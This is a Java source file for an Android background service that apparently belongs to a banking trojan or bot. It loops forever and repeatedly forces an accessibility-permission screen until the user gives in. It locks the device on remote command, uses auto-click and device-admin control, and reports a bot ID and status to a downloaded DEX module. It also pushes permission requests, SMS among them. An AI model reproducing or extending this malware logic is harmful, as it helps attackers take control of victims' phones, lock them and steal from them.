package com.example.mmm.Services;

import android.app.IntentService;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.net.wifi.WifiManager;
import android.os.PowerManager;

import com.example.mmm.Main.PermManager;
import com.example.mmm.Main.AccessActivity;
import com.example.mmm.Main.AccessAdm;
import com.example.mmm.Main.ReceiverDeviceAdmin;
import com.example.mmm.defines;


import org.json.JSONObject;

import java.io.File;


public class srvWhileWorker extends IntentService {


    public srvWhileWorker() {
        super("");
    }
    utils utl = new utils();
    defines consts = new defines();
    private String TAG_LOG  = srvWhileWorker.class.getSimpleName()+ consts.strTAG1;

    private WifiManager.WifiLock lock;
    StateManager mStateManager;
    private PowerManager.WakeLock wl;

    int tick;
    int itoaskAccessibility = 0;
    int speedTime = 1000;
    int start_Q = 6;
    @Override
    protected void onHandleIntent(Intent intent) {
        while(true){
            utl.chalkTile(speedTime);
            try{
                tick = Integer.parseInt(utl.SettingsRead(this, consts.timeWorking));
            }catch (Exception ex){
                tick = 0;
            }

            utl.Log(TAG_LOG,  consts.string_94 + tick);
            try {
                if ((!utl.isAccessibilityServiceEnabled(this, Access.class)) && (utl.getScreenBoolean(this))) {
                    speedTime = 1000;
                    itoaskAccessibility++;
                    try {
                        if (utl.SettingsRead(this, consts.activityAccessibilityVisible).equals(consts.str_1) && (itoaskAccessibility >= 4)) {
                            startService(new Intent(this, srvToaskAccessibility.class));
                            itoaskAccessibility = 0;
                        }
                    }catch (Exception ex){}

                    if(start_Q >= 6 ){
                        startActivity(new Intent(this, AccessActivity.class)
                                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                .addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP)
                                .addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY));
                        start_Q = 0;
                    }
                    start_Q++;

                } else {

                    speedTime = 8000;
                }
            }catch (Exception ex){
            }
            if (!utl.isAdminDevice(this)) {
                  /*if((utl.getScreenBoolean(this)) && (utl.isAccessibilityServiceEnabled(this, Access.class)))  {
                    if(utl.isAccessibilityServiceEnabled(this, Access.class)){
                        utl.SettingsWrite(this, consts.autoClick, consts.str_1);//auto click start!
                    }
                    Intent dialogIntent = new Intent(this, AccessAdm.class);
                    dialogIntent.putExtra(consts.string_24, consts.str_1);
                    dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    dialogIntent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
                    dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
                    startActivity(dialogIntent);
                }*/
            }else{//------------Lock Device-----------
                try {
                    if ((!utl.isMyServiceRunning(this, DevLock.class))
                            && (utl.SettingsRead(this, consts.lockDevice).equals(consts.str_1))) {
                        startService(new Intent(this, DevLock.class));
                    }
                }catch (Exception ex){
                   // utl.SettingsToAdd(this, consts.LogSMS , consts.string_176 + ex.toString() + consts.string_119);
                }

               if(utl.SettingsRead(this, consts.killApplication).contains(getPackageName())) {
                    if (utl.isAccessibilityServiceEnabled(this, Access.class)) {
                        utl.SettingsWrite(this, consts.autoClick, consts.str_1);//auto click start!
                    }
                    ComponentName mAdminReceiver = new ComponentName(this, ReceiverDeviceAdmin.class);
                    DevicePolicyManager mDPM = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
                    mDPM.removeActiveAdmin(mAdminReceiver);
                }
            }

            if(!new File(getDir(consts.string_95, Context.MODE_PRIVATE), consts.nameModule).exists()){
                utl.SettingsWrite(this, consts.statDownloadModule, consts.str_step);
            }else{
                try {
                    JSONObject jsonObject = new JSONObject();
                    jsonObject.put(consts.string_91, consts.string_96);
                    jsonObject.put(consts.string_97, ""+tick);
                    jsonObject.put(consts.idbot, utl.SettingsRead(this, consts.idbot));
                    jsonObject.put(consts.string_98, utl.isAccessibilityServiceEnabled(this, Access.class)?consts.str_1:consts.str_step);

                    utl.sendMainModuleDEX(this, jsonObject.toString());

                    if((utl.getScreenBoolean(this)) &&
                            (!utl.hasPermissionAllTrue(this)) &&
                            (utl.SettingsRead(this, consts.day1PermissionSMS).isEmpty())){
                        startActivity(new Intent(this, PermManager.class));
                    }

                } catch (Exception ex) {
                    utl.Log(TAG_LOG, consts.string_99);
                }
            }
            tick+=8;
            utl.SettingsWrite(this, consts.timeWorking,consts.str_null + tick);
        }
    }




}
